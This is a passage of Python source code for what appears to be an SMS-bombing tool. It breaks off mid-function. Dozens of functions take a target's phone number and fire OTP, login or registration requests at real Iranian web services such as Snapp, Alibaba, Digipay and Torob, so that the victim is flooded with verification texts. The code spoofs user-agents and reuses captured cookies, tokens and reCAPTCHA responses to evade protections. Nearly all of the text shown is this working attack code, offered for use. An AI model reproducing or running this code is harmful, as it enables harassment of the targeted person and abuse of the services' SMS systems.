7NcYcxdQ5twSDWPUmKK-k0xZMdeACUclkYYFNPqGSccGX0jpioyET0sMFrHQyeOvHxGPLfMeoTaXUA8LMognQ3oCWCsZHrcaQSJJ7H9WUIf4SYUvRwp-RE4JUxpOXvxgPjk0b1VUYF0dHjf1C-uQ3D7aYEAuzSW0JWyEFhurNpBaeQQhf35HH-SchuWCjafAr8rU0BCNkQJd4aresr7moHos1a_KoeQ2Y1HloPzsjOzRSpK97vApN0naRwK8k9RsoN65URZDbEzTc1b2dpTUR-VJw7lU0v5jT_PvZs7GUnpnv23UrYQIfMKISF9suy6ufb26DdIAr2pLOQ9NKqxb4QwDadFa1gPIpb_QU-8hL6N9533YTvTE8xJJjjwE6IQutNsZ1OdBdrj4APjNczDpb3PFaXtI0CbOKHYIUDsdyEIdF1o9RYrKYj-EP61SA0gzks-qYGJR1jnfQRkwkqoolu2lvDK0PxDXnM4Crd4kJRxVtrsD0P8P-jEvW6PYAmxXPtnsu5zxSMnllNNeOOAijcxG6IyPW-smsHV-6BAdk5w3FXAPe0ZcuDXb0gZseq2-GnqxmNDmRWyHc9TuGhAhWdxaP-aNm6MmoSVJ-G6fLsjXY3KLaRnIhmNfABxqcx0f03g6sBIh_1Rw965_WydlsMVU_K5-AIfsXPSxSmVnIPrN4VasUnp3XbJmnO9lm_rrpdNAM3VK20UPLCpxI7Ymxdl9wboAg8cdPlyBxIcClwtui0RC1FGZ-GpvVzWZDq_Mu6UEbU3bfi9Brr5CJ-0aa8McOK8TJBHCqfLHYOOqAruaLHhNR0fjw-bIzHLKtxGhwkkGp7n_28HtbiZVKqr48rBfbhzanCpSPYGDV4PM1_zrJDUJn4sRitw_Z78Lju3ssjuMae8zAEdHUCHGui_tYMABlPVaZhsB4s-KahT4aTOhzd7ejjoLE9WQUSuQBmMTGFZM0xH0Phyz1vSl7_5IpTHcCwTXUx3s8UvRB-Q3QQBa5O82gtZWTd56R7u0YrCJKVEnsf9a9lZz9Of6R4YdPhwByMvHFfbRLgNkuGzv75dZZf24KmbPTZN4sVCZgxD7oO0sTgh2hEYMSmdHnXvCySXZk_1G52yP8S7IwnEXRq_Hu1aje2dz0FRWYFR8nnmFuRyYSfj1rSy1Vut4ktNUsstlAYn8QmsvNqyn402aikpuG6s0ApOGMuLChv_BDd_tbsLu11-qLv3r5Exza9XJMq4aOFegpPJ5vH75entTpxPa16gmJ80lhlvKux0vnZI-mEDZ8zEI5uXi26zv4taUqLNw5nXQZbi8sxh90nYF1fNAQ-ERHQmoUeqAwL9AuZobvR7pRMmmjZMPeeDPPFrNDyCHYFO_Iu5kClQM_7jzmsLkOvCD68DkwhwftkNvTiA-dDqkkNpY8OB0GI4ynhrAqHN4Y378qbks7q4ifUU1NsSI5xdkHC4fseKMJTnnCYdyfhH14_X46zuAvSIL7DX262VTb6dAIN5KoHkjacc77Z4V7HsncWBysaXqK5yUIkL3JB5AiZlp8nV0_hCjNfA3QsfGQVoMYYeoTIutKF9Hr9r1efOXmTU0URZ-C6LYgzcntKlryroLwVg5jP3s2jQyCTIvs4CitUAyJEC3VyeW_VlSA02uMqxB-pjkipGEKe3KO1diCU7afe0xkd5C4K1NG-kLAbRAhCCtLRVJVSP0a_t84F737B9lub6bs5QcCvxARlfogXerUg9MjMU9qCWLzN9x2MukbsijxzmsGFcw-OBecMETDwoyB_0HrxP95QCwxw_X4rcW60HL45xbv9iC-gsn1qd-FKzO-XSYU0VWprr_z12bl9QOnpMc6OYf74IeJ27zl1nWR_gLo-Wg-WeFDyWcpNjmiHZkHYiDa1c3RgFv2t4ezYP0tsQEzLy-Yx0yB7WI5Z2kd_cSuaX73U9PW7rOCGnCD9cfyxZ27VyiHx8YMKKch6lyNmwPGfMhYqgMMo4NLmKy44taXRKPV20DhIsuNdMPcPUofrrrTsKarxurCX8EwRev4Ox-GcP-ocFtjKq_jkGRnqh4QQrJJh3Unpxm3sHcWhIWkNIcyChdjwnHPqKLb49UbVyJKxkt26E-cuO7_oC7PbMe8YjKFrmr2_igqr9i-YioVy1MdI5TL9sZhS8bMwG2rMozBYqWT9czRIKwabP9dUKpEn-d1nLbdrEeSzXOLYtXutiO57lGpxTDgf3ELp1zIEvTW7SEJBQ; crisp-client%2Fsession%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=session_69ff5918-b549-4c78-89fd-b851ca35bdf6; crisp-client%2Fsocket%2F4df7eed4-f44a-4e3d-a5cc-98ec87b592bc=0','origin': 'https://snappfood.ir','referer': 'https://snappfood.ir/','user-agent': generate_user_agent(os="linux")}
        sfoodD = {"cellphone": "0"+phone.split("+90")[1]}
        try:
            post(url=sfoodU,  headers=sfoodH, data=sfoodD)
            return True
        except:
            pass


    def alibaba(phone):
        alibabaH = {"Host": "ws.alibaba.ir", "User-Agent":generate_user_agent(os="win"), "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR", "ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy", "Content-Type": "application/json;charset=utf-8", "Content-Length": "29", "Origin": "https://www.alibaba.ir", "Connection": "keep-alive", "Referer": "https://www.alibaba.ir/hotel"}
        alibabaD = {"phoneNumber": "0"+phone.split("+90")[1]}
        try:
            post(url='https://ws.alibaba.ir/api/v3/account/mobile/otp',    headers=alibabaH, json=alibabaD)
            return True
        except:
            pass


    def smarket(phone):
        smarketU = f'https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{phone.split("+90")[1]}'
        smarketH = {'referer': 'https://snapp.market/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=smarketU, headers=smarketH)
            return True
        except:
            pass


    def arka(phone):
        # arka api
        arkaH = {"Host": "api.chartex.net", "User-Agent": generate_user_agent(os="win"), "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Origin, Accept, Content-Type, Authorization, Access-Control-Allow-Origin", "provider-code": "RUBIKA", "Authorization": "JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTgwMzU0NDEsImlhdCI6MTU5Nzg2MjY0MSwibmJmIjoxNTk3ODYyNjQxLCJhZCI6MTA2NDIxLCJpZCI6MTA2NDIyLCJyb2xlIjoiR1VFU1QiLCJzZXNzaW9uX2tleSI6ImxvZ2luX3Nlc3Npb25fMTA2NDIxXzEwNjQyMl9JQXdqUkZrTVBMUWhJeG5oSGFlQXdqVHciLCJwYyI6bnVsbCwiYyI6IklSUiJ9.wMAa_fI7VVBal8IhBeM-6wmGK4bDUOEj2fjoKhknyRk", "Cache-Control": "no-cache", "Plugin-version": "3.12.15", "Content-Type": "application/json;charset=utf-8", "Content-Length": "69", "Origin": "https://arkasafar.ir", "Connection": "keep-alive", "Referer": "https://arkasafar.ir/"}
        arkaD = {"mobile": "0" + phone.split("+90")[1], "country_code": "IR", "provider_code": "RUBIKA"}
        try:
            post(url='https://api.chartex.net/api/v2/user/validate', headers=arkaH, json=arkaD)
            return True
        except:
            pass


    def sTrip(phone):
        sTripH = {"Host": "www.snapptrip.com", "User-Agent": generate_user_agent(os="win"), "Accept": "*/*", "Accept-Language": "fa", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json; charset=utf-8", "lang": "fa", "X-Requested-With": "XMLHttpRequest", "Content-Length": "134", "Origin": "https://www.snapptrip.com", "Connection": "keep-alive", "Referer": "https://www.snapptrip.com/","Cookie": "route=1597937159.144.57.429702; unique-cookie=KViXnCmpkTwY7rY; appid=g*-**-*; ptpsession=g--196189383312301530; _ga=GA1.2.118271034.1597937174; _ga_G8HW6QM8FZ=GS1.1.1597937169.1.0.1597937169.60; _gid=GA1.2.561928072.1597937182; _gat_UA-107687430-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=445b5d83-abeb-7ffd-091e-ea1ce5cfcb52; analytics_token=2809eef3-a3cf-7b9c-4191-8d8be8e5c6b7; yektanet_session_last_activity=8/20/2020; _hjid=b1148e0d-8d4b-4a3d-9934-0ac78569f4ea; _hjAbsoluteSessionInProgress=0; MEDIAAD_USER_ID=6648f107-1407-4c83-97a1-d39c9ec8ccad", "TE": "Trailers"}
        sTripD = {"lang": "fa", "country_id": "860", "password": "snaptrippass", "mobile_phone": "0" + phone.split("+90")[1], "country_code": "+90", "email": "example@gmail.com"}
        try:
            post(url='https://www.snapptrip.com/register',  headers=sTripH, json=sTripD)
            return True
        except:
            pass


    def filmnet(phone):
        fnU = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
        fNh = {'Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','DNT': '1','X-Platform': 'Web','User-Agent': generate_user_agent(os="win"),'Origin': 'https://filmnet.ir','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://filmnet.ir/','Accept-Language': 'fa,en-US;q=0.9,en;q=0.8','Cache-Control': 'no-cache','Accept-Encoding': 'gzip, deflate'}
        try:
            get(url=fnU, headers=fNh)
            return True
        except:
            pass


    def drdr(phone):
        dru = f"https://drdr.ir/api/registerEnrollment/sendDisposableCode"
        drh = {'Connection': 'keep-alive','Accept': 'application/json','Authorization': 'hiToken','User-Agent': generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://drdr.ir','Referer': 'https://drdr.ir/','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate'}
        try:
            post(url=dru, headers=drh, params={"phoneNumber": phone, "userType": "PATIENT"})
            return True
        except:
            pass


    def bahram_shop(phone):
        rhead = {"user-agent": generate_user_agent()}
        bahram_request = {"username": "0"+phone.split("+90")[1]}
        bahram = 'https://api.bahramshop.ir/api/user/validate/username'
        try:
            for i in range(0, 2):
                post(bahram, json=bahram_request, headers=rhead)
                sleep(0.2)
            return True
        except:
            pass


    def banimode(phone):
        bnJ = {"phone": '0'+phone.split('+90')[1]}
        bnU = 'https://mobapi.banimode.com/api/v2/auth/request'
        bnH = {'Accept': '*/*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Access-Control-Request-Headers': 'content-type,platform','Access-Control-Request-Method': 'POST','Connection': 'keep-alive','Host': 'mobapi.banimode.com','Origin': 'https://www.banimode.com','Referer': 'https://www.banimode.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=bnU, headers=bnH, json=bnJ)
            return True
        except:
            pass


    def okcs(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(url="https://okcs.com/users/mobilelogin?mobile=0" + phone.split("+90")[1], headers=rhead)
            return True
        except:
            pass


    def binjo(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(url="https://api.binjo.ir/api/panel/get_code/0" + phone.split("+90")[1], headers=rhead)
            return True
        except:
            pass


    def chamedoon(phone):
        chJ = {"mobile": '0'+phone.split('+90')[1],"origin": "/","referrer_id": None}
        chU = 'https://chamedoon.com/api/v1/membership/guest/request_mobile_verification'
        chH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json;charset=UTF-8','cookie': 'activity=%7B%22referrer_id%22%3Anull%2C%22origin%22%3A%22%2F%22%7D','origin': 'https://chamedoon.com','referer': 'https://chamedoon.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=chU, headers=chH, json=chJ)
            return True
        except:
            pass


    def kilid(phone):
        kiJ = {"mobile": '0'+phone.split('+90')[1]}
        kiU = 'https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL'
        kiH = {'Accept': 'application/json, text/plain, */*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/json','COUNTRY_ID': '2','Host': 'server.kilid.com','LOCALE': 'FA','Origin': 'https://kilid.com','Referer': 'https://kilid.com/','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=kiU, headers=kiH, json=kiJ)
            return True
        except:
            pass


    def pinket(phone):
        rhead = {"user-agent": generate_user_agent()}
        pinket_request = {"phoneNumber": "0"+phone.split("+90")[1]}
        pinket_url = 'https://pinket.com/api/cu/v2/phone-verification'
        try:
            post(pinket_url, json=pinket_request, headers=rhead)
            return True
        except:
            pass


    def otaghak(phone):
        rhead = {"user-agent": generate_user_agent()}
        otaghak_request = {"userName": "0"+phone.split("+90")[1]}
        otaghak_url = 'https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode'
        try:
            post(otaghak_url, json=otaghak_request, headers=rhead)
            return True
        except:
            pass


    def shab(phone):
        rhead = {"user-agent": generate_user_agent()}
        shab_request = {"mobile": "0"+phone.split("+90")[1], "country_code": "+90"}
        shab_url = 'https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile'
        try:
            post(shab_url, json=shab_request, headers=rhead)
            return True
        except:
            pass


    def itoll(phone):
        itJ = {'mobile': phone}
        itU = 'https://app.itoll.ir/api/v1/auth/login'
        itH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'fa','content-type': 'application/json;charset=UTF-8','origin': 'https://itoll.ir','referer': 'https://itoll.ir/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=itU, headers=itH, json=itJ)
            return True
        except:
            pass


    def pubisha(phone):
        rhead = {"user-agent": generate_user_agent()}
        pubisha_request = "mobile=0"+phone.split("+90")[1]
        pubisha_url = 'https://www.pubisha.com/login/checkCustomerActivation'
        try:
            post(pubisha_url, json=pubisha_request, headers=rhead)
            return True
        except:
            pass


    def wis(phone):
        try:
            post("https://gateway.wisgoon.com/api/v1/auth/login/",json={"phone": "0"+phone.split("+90")[1], "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg","token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"}, headers={"Host": "gateway.wisgoon.com","content-length": "582","accept": "application/json","save-data": "on","user-agent": generate_user_agent(os="android"),"content-type": "application/json","origin": "https://m.wisgoon.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://m.wisgoon.com/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8,fa;q\u003d0.7", }, timeout=5)
            return True
        except:
            pass


    def digipay(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://app.mydigipay.com/digipay/api/users/send-sms", json={"cellNumber": "0"+phone.split("+90")[1], "device": {"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f", "deviceModel": "WEB_BROWSER", "deviceAPI": "WEB_BROWSER", "osName": "WEB"}},headers=rhead, timeout=5)
            return True
        except:
            pass


    def gap(phone):
        gapH = {"Host": "core.gap.im", "accept": "application/json, text/plain, */*", "x-version": "4.5.7", "accept-language": "fa","user-agent": generate_user_agent(os="android"), "appversion": "web", "origin": "https://web.gap.im", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://web.gap.im/", "accept-encoding": "gzip, deflate, br"}
        try:
            get(url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
            return True
        except:
            pass


    def torob(phone):
        phone = '0'+phone.split('+90')[1]
        torobH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','cookie': 'abtest=next_pwa; search_session=ofwjiyqqethomevqrgzxvopjtgkgimdc; _gcl_au=1.1.805505755.1639260830; _gid=GA1.2.683761449.1639260830; _gat_UA-105902196-1=1; _ga_CF4KGKM3PG=GS1.1.1639260830.1.0.1639260830.0; _clck=130ifw1|1|ex6|0; _ga=GA1.2.30224238.1639260830','origin': 'https://torob.com','referer': 'https://torob.com/','user-agent': generate_user_agent(os="linux")}
        try:
            torobR = get(url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH)
            return True
        except:
            pass


    def taghche(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://gw.taaghche.com/v4/site/auth/signup",json={"contact": "0"+phone.split("+90")[1]},headers=rhead, timeout=5)
            return True
        except:
            pass


    def namava(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName": phone},headers=rhead ,timeout=5)
            return True
        except:
            pass


    def sheypoor(phone):
        sheyporH = {"Host": "www.sheypoor.com", "User-Agent": generate_user_agent(os="win"), "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Content-Length": "62", "Origin": "https://www.sheypoor.com", "Connection": "keep-alive", "Referer": "https://www.sheypoor.com/session","Cookie": "plog=False; _lba=false; AMP_TOKEN=%24NOT_FOUND; ts=46f5e500c49277a72f267de92dd51238; track_id=22f97cea33f34e368e4b3edd23afd391; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_session_token=3f475c6e-f55b-0d29-de67-6cdc46bc6592; analytics_token=3cce634d-040a-baf3-fdd6-552578d672df; yektanet_session_last_activity=8/13/2020; _yngt=0bc37b56-6478-488b-c801-521f101259fd; _lbsa=false; _ga=GA1.2.1464689488.1597346921; _gid=GA1.2.1551213293.1597346921; _gat=1", "TE": "Trailers"}
        sheyporD = {"username": "0"+phone.split("+90")[1]}
        try:
            post(url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD)
            return True
        except:
            pass


    def doctor(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            get(f'https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/{phone.split("+90")[1]}/sms?cCode=+90', headers=rhead, timeout=5)
            return True
        except:
            pass


    def achar(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.achareh.ir/v2/accounts/login/',data={"phone": "0"+phone.split("+90")[1], "utm_source": "null"}, headers=rhead ,timeout=5)
            return True
        except:
            pass


    def snapp(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.snapp.ir/api/v1/sms/link',json={"phone": "0"+phone.split("+90")[1]},headers=rhead ,timeout=5)
            return True
        except:
            pass


    def tap30(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://api.tapsi.cab/api/v2/user', json={"credential": {"phoneNumber": "0"+phone.split("+90")[1], "role": "PASSENGER"}}, headers=rhead, timeout=5)
            return True
        except:
            pass


    def tmg(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://tagmond.com/phone_number', data='utf8=%E2%9C%93&phone_number=' +"0"+phone.split("+90")[1]+'&g-recaptcha-response=', headers=rhead)
            return True
        except:
            pass


    def a4baz(phone):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post('https://a4baz.com/api/web/login',json={"cellphone": "0"+phone.split("+90")[1]}, headers=rhead)
            return True
        except:
            pass


    def doctoreto(phone):
        try:
            post('https://api.doctoreto.com/api/web/patient/v1/accounts/register', 
            json={"mobile": "0"+phone.split("+90")[1], "country_id": 205}, 
            headers={'Connection': 'keep-alive','Accept': 'application/json','X-Requested-With': 'XMLHttpRequest','User-Agent': generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://doctoreto.com','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://doctoreto.com/','Accept-Language': 'en-US,en;q=0.9'})
            return True
        except:
            pass


    def okorosh(phone):
        okJ = {"mobile": "0"+phone.split("+90")[1],"g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"}
        okU = 'https://my.okcs.com/api/check-mobile'
        okH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-type': 'application/json;charset=UTF-8','cookie': '_ga=GA1.2.1201761975.1639324247; XSRF-TOKEN=eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0%3D; myokcs_session=eyJpdiI6InlYaXBiTUw1dHFKM05rN0psNjlwWXc9PSIsInZhbHVlIjoiNDg1QWJQcGwvT3NUOS9JU1dSZGk2K2JkVlNVV2wrQWxvWGVEc0d1MDR1aTNqVSs4Z0llSDliMW04ZFpGTFBUOG82NEJNMVFmTmNhcFpzQmJVTkpQZzVaUEtkSnFFSHU0RFprcXhWZlY0Zit2UHpoaVhLNXdmdUZYN1RwTnVLUFoiLCJtYWMiOiI5NTUwMmI2NDhkNWJjNDgwOGNmZjQxYTI4YjA0OTFjNTQ5NDc0YWJiOWIwZmI4MTViMWM0NDA4OGY5NGNhOGIzIn0%3D','origin': 'https://my.okcs.com','referer': 'https://my.okcs.com/','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest','x-xsrf-token': 'eyJpdiI6IllzYkQvdHJ5NVp3M1JyZmYweWFDTGc9PSIsInZhbHVlIjoiZ0wxQUZjR2ZzNEpPenFUZUNBZC95c2RFaEt4Y2x4VWJ2QlBmQ1ZIbUJHV2VEOGt0VG1XMXBaOVpJUFBkK2NOZmNvckxibDQ5cDkxc2ZJRkhJQUY4RlBicU80czIvZWhWZm1OSnJZMXZEbXE4TnlVeGZUSDhSYU9PRzZ6QzZGMkYiLCJtYWMiOiI2NWZlOTkxMTBjZDA5NzkyNDgwMjk2NGEwMDQzMGVhM2U1ODEzNmQ1YjExY2Q1ODc5MDFmZDBhMmZjMjQwY2JjIn0='}
        try:
            post(url=okU, headers=okH, json=okJ).text
            return True
        except:
            pass


    def gapfilm(phone):
        gaJ = {"Type": 3,"Username": phone.split("+90")[1],"SourceChannel": "GF_WebSite","SourcePlatform": "desktop","SourcePlatformAgentType": "Opera","SourcePlatformVersion": "82.0.4227.33","GiftCode": None}
        gaU = 'https://core.gapfilm.ir/api/v3.1/Account/Login'
        gaH = {'Accept': 'application/json, text/plain, */*','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'fa','Browser': 'Opera','BrowserVersion': '82.0.4227.33','Connection': 'keep-alive','Content-Type': 'application/json','Host': 'core.gapfilm.ir','IP': '185.156.172.170','Origin': 'https://www.gapfilm.ir','OS': 'Linux','Referer': 'https://www.gapfilm.ir/','SourceChannel': 'GF_WebSite','User-Agent': generate_user_agent(os="linux")}
        try:
            post(url=gaU, headers=gaH, json=gaJ)
            return True
        except:
            pass


    def anar(phone):
        anrJ = {'user': phone, 'app_id': 99}
        anrU = 'https://api.anargift.com/api/people/auth'
        anrH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '34','content-type': 'application/json;charset=UTF-8','origin': 'https://anargift.com','referer': 'https://anargift.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=anrU, headers=anrH, json=anrJ)
            return True
        except:
            pass


    def azki(phone):
        azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{phone}"%7D'
        azkH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==','device': 'web','deviceid': '6','password': 'BimitoSecret','origin': 'https://www.azki.com','referer': 'https://www.azki.com/','user-agent': generate_user_agent(os="linux"),'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE','username': 'BimitoClient'
        }
        try:
            post(url=azkU, headers=azkH)
            return True
        except:
            pass


    def nobat(phone):
        noJ = {'mobile': phone}
        noU = 'https://nobat.ir/api/public/patient/login/phone'
        noH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','access-control-request-headers': 'nobat-cookie','access-control-request-method': 'POST','origin': 'https://user.nobat.ir','referer': 'https://user.nobat.ir/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=noU, headers=noH, json=noJ)
            return True
        except:
            pass


    def lendo(phone):
        leD = {'_token': 'mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6','mobile': '0'+phone.split('+90')[1],'password': 'ibvvb@3#9nc'}
        leU = 'https://lendo.ir/register?'
        leH = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Cache-Control': 'max-age=0','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'lendo_session=eyJpdiI6Imh2QXVnS3Q1ejFvQllhSVgzRTZORVE9PSIsInZhbHVlIjoicFE0VzJWc016a3BHXC9CRTE3S21OSXV0XC84U015VTJwdDBRVWZNUDRIUmxmS1gwSDR5NVEwQlhmaUlMdTM2XC9EQyIsIm1hYyI6ImMzMWRhYWE1ODA3MTE1ZGI5ZGIxNTAxNTg5NzBhNWYzNjZjNzk2MDNhYWNlNTU1OTc5ZTYzNjNmYWU5OGZiMWIifQ%3D%3D','Host': 'lendo.ir','Origin': 'https://lendo.ir','Referer': 'https://lendo.ir/register','Upgrade-Insecure-Requests': '1','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=leU, headers=leH, data=leD).text
            return True
        except:
            pass


    def olgoo(phone):
        olD = {'contactInfo[mobile]': '0'+phone.split('+90')[1],'contactInfo[agreementAccepted]': '1','contactInfo[teachingFieldId]': '1','contactInfo[eduGradeIds][7]': '7','submit_register': '1'}
        olU = 'https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox'
        olH = {'Accept': 'text/plain, */*; q=0.01','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Length': '163','Content-Type': 'application/x-www-form-urlencoded','Cookie': 'PHPSESSID=l1gv6gp0osvdqt4822vaianlm5','Host': 'www.olgoobooks.ir','Origin': 'https://www.olgoobooks.ir','Referer': 'https://www.olgoobooks.ir/sn/userRegistration/','X-Requested-With': 'XMLHttpRequest','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=olU, headers=olH, data=olD).text
            return True
        except:
            pass


    def pakhsh(phone):
        paD = f'action=digits_check_mob&countrycode=%2B90&mobileNo=0{phone.split("+90")[1]}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0'
        paU = 'https://www.pakhsh.shop/wp-admin/admin-ajax.php'
        paH = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '143','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'digits_countrycode=90; _wpfuuid=b21e7550-db54-469f-846d-6993cfc4815d','origin': 'https://www.pakhsh.shop','referer': 'https://www.pakhsh.shop/%D9%85%D8%B1%D8%A7%D8%AD%D9%84-%D8%AB%D8%A8%D8%AA-%D8%B3%D9%81%D8%A7%D8%B1%D8%B4-%D9%88-%D8%AE%D8%B1%DB%8C%D8%AF/','user-agent': generate_user_agent(os="linux"),'x-requested-with': 'XMLHttpRequest'}
        try:
